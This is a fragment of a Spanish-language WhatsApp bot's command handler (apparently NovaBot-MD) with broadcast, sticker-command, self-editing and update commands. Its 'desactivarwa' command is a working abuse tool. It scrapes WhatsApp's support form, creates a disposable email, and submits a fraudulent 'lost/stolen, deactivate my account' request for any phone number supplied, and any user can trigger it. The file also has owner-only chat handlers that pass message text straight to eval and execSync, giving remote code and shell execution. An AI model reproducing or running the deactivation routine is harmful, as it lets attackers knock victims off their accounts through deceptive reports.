if (!text) return conn.sendMessage(from, { text: `*Ingrese el texto que quiere difundir*` }, { quoted: msg }); 
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`*Enviando mensajes oficial un momento*`)
for (let i of anu) {
await sleep(1500)
let txt = `「 COMUNICADO 」\n\n${text}`
conn.sendText(i, txt, fkontak)
}
reply(`ᴛʀᴀɴsᴍɪsɪᴏɴ ʀᴇᴀʟɪᴢᴀᴅᴀ ᴄᴏɴ ᴇxɪᴛᴏs ✅ ᴛᴏᴛᴀʟ ${anu.length} ᴄʜᴀᴛ ɢʀᴜᴘᴏs\nᴛɪᴇᴍᴘᴏ ᴛᴏᴛᴀʟ ᴅᴇ ᴇɴᴠɪᴏ: ${anu.length * 1.5} sᴇɢ`)}
break
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
if (!text) return conn.sendMessage(from, { text: `*Ingrese el texto*` }, { quoted: msg }); 
let anu = await store.chats.all().map(v => v.id)
reply(`ᴛʀᴀɴsᴍɪsɪᴏɴ ʀᴇᴀʟɪᴢᴀᴅᴀ ᴄᴏɴ ᴇxɪᴛᴏs ✅ ᴛᴏᴛᴀʟ ${anu.length} ᴄʜᴀᴛs`)
for (let yoi of anu) {
await sleep(1500)
conn.sendText(yoi, txt, fkontak)}
reply('Listo')}
break
            
case 'addcmd':
if (!isCreator) return conn.adReply(m.chat, info.owner, query, m, false)
if (!m.quoted) return conn.adReply(m.chat, `*[ ⚠️ ] 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙴 𝙰𝙻 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙾 𝙸𝙼𝙰𝙶𝙴𝙽 𝙰𝙻 𝙲𝚄𝙰𝙻 𝙳𝙴𝚂𝙴𝙰 𝙰𝙶𝚁𝙴𝙶𝙰𝚁 𝚄𝙽 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙾 𝚃𝙴𝚇𝚃𝙾*`, query, m, false)
if (!m.quoted.fileSha256) return conn.AdReply(m.chat, `*[ ⚠️ ] 𝚂𝙾𝙻𝙾 𝙿𝚄𝙴𝙳𝙴𝚂 𝙰𝚂𝙸𝙶𝙰𝙽𝙰𝚁 𝙲𝙾𝙼𝙰𝙽𝙳𝙾𝚂 𝙾 𝚃𝙴𝚇𝚃𝙾𝚂 𝙰 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝚂 𝙴 𝙸𝙼𝙰𝙶𝙴𝙽𝙴𝚂*`, query, m, false)
if (!text) return conn.AdReply(m.chat, `*[ ⚠️ ] 𝙴𝚁𝚁𝙾𝚁 𝙳𝙴 𝚄𝚂𝙾, 𝚃𝙴𝚇𝚃𝙾 𝙵𝙰𝙻𝚃𝙰𝙽𝚃𝙴*\n\n*𝙴𝙹𝙴𝙼𝙿𝙻𝙾 𝙳𝙴 𝚄𝚂𝙾 𝙲𝙾𝚁𝚁𝙴𝙲𝚃𝙾 𝙳𝙴𝙻 𝙲𝙾𝙼𝙰𝙽𝙳𝙾:*\n*${usedPrefix + command} <#menu> <responder a sticker o imagen>*`, query, m, false)
var hash = m.quoted.fileSha256.toString('base64')
addCmd(text, hash)
m.reply(`*[ ✔ ] ᴇʟ ᴛᴇxᴛᴏ/ᴄᴏᴍᴀɴᴅᴏ ᴀsɪɢɴᴀᴅᴏ ᴀʟ sᴛɪᴄᴋᴇʀ/ɪᴍᴀɢᴇɴ ғᴜᴇ ᴀɢʀᴇɢᴀᴅᴏ ᴀ ʟᴀ ʙᴀsᴇ ᴅᴇ ᴅᴀᴛᴏs ᴄᴏʀʀᴇᴄᴛᴀᴍᴇɴᴛᴇ*`)
break
case 'delcmd': 
if (!isCreator) return conn.adReply(m.chat, info.owner, query, m, false)
if (!m.quoted) return conn.adReply(m.chat, `*[ ⚠️ ] 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙴 𝙰𝙻 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙾 𝙸𝙼𝙰𝙶𝙴𝙽 𝙰𝙻 𝙲𝚄𝙰𝙻 𝙳𝙴𝚂𝙴𝙰 𝙰𝙶𝚁𝙴𝙶𝙰𝚁 𝚄𝙽 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙾 𝚃𝙴𝚇𝚃𝙾*`, query, m, false)
var hash = m.quoted.fileSha256.toString('base64')
if (!hash) return conn.adReply(m.chat, `*El sticker no tiene un comando asignado!!*`, query, m, false)
delete global.db.data.sticker[hash]
m.reply(`*hecho*`)
break
	    
case "desactivarwa": {
if (Input) {
let cekno = await conn.onWhatsApp(Input)
if (cekno.length == 0) return reply(`El participante ya no está registrado en WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return reply(`Solo para mi jefe`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({url, method: "POST", data: form, headers: {cookie}})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`*Listo..!*`)
} else if (payload.includes(`"payload":false`)) {
reply(`Uff Limit moment whatsapp.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('*⚠️Ingresa el numero*')}
break
	    
case 'addcase':
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
if (!text) throw 'envia el case'
try {
const addcase =[fs.readFileSync('main.js', 'utf8').slice(0, fs.readFileSync('main.js', 'utf8').lastIndexOf('break') + 5), q, fs.readFileSync('main.js', 'utf8').slice(fs.readFileSync('main.js', 'utf8').lastIndexOf('break') + 5)].join('\n');
fs.writeFileSync('main.js', addcase)
conn.editMessage(m.chat, '*aguarde estoy agregado el case*', '*Listo!!*', 5, m)
} catch (error) {
throw error
}
break
	    
case 'getcase': 
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
if (!text) return m.reply(`Que comando a buscar o que?`) 
try { 
bbreak = 'break' 
reply('case ' + `'${args[0]}'` + fs.readFileSync('./main.js').toString().split(`case '${args[0]}'`)[1].split(bbreak)[0] + bbreak) 
} catch (err) { 
console.error(err) 
reply(" Error, tal vez no existe el comando") 
} 
break

case 'update': 
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await conn.sendMessage(from, { text: stdout.toString() }, { quoted: msg });
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/elrebelde21/NovaBot-MD.git && git pull')
await conn.sendMessage(from, { text: updatee.toString() }, { quoted: msg })}  
break

function msToTime(duration) { 
   var milliseconds = parseInt((duration % 1000) / 100), 
     seconds = Math.floor((duration / 1000) % 60), 
     minutes = Math.floor((duration / (1000 * 60)) % 60), 
     hours = Math.floor((duration / (1000 * 60 * 60)) % 24); 
  
   hours = hours < 10 ? "0" + hours : hours; 
   minutes = minutes < 10 ? "0" + minutes : minutes; 
   seconds = seconds < 10 ? "0" + seconds : seconds; 
  
   return minutes + " m y " + seconds + " s "; 
 }
         
        default:
            if (budy.startsWith('>')) {
                if (!isCreator) return
                try {
                    return reply(JSON.stringify(eval(budy.slice(2)), null, '\t'))
                } catch (e) {
                    e = String(e)
                    reply(e)
                }
            }
            if (budy.startsWith('=>')) {
                if (!isCreator) return
                try {
                    return  reply(JSON.stringify(eval(`(async () => { ${budy.slice(3)} })()`), null, '\t'))  //gata.sendMessage(from, JSON.stringify(eval(`(async () => { ${budy.slice(3)} })()`), null, '\t'), text, { quoted: msg })
                } catch (e) {
                    e = String(e)
                    reply(e)
                }
            }
            if (budy.startsWith('$')) {
                if (!isCreator) return
                try {
                    return reply(String(execSync(budy.slice(2), { encoding: 'utf-8' })))
                } catch (err) {
console.log(util.format(err))
let e = String(err)
conn.sendMessage("595975740803@s.whatsapp.net", { text: "Hola Creador/desarrollador, parece haber un error, por favor arreglarlo 🥲" + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})}}}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
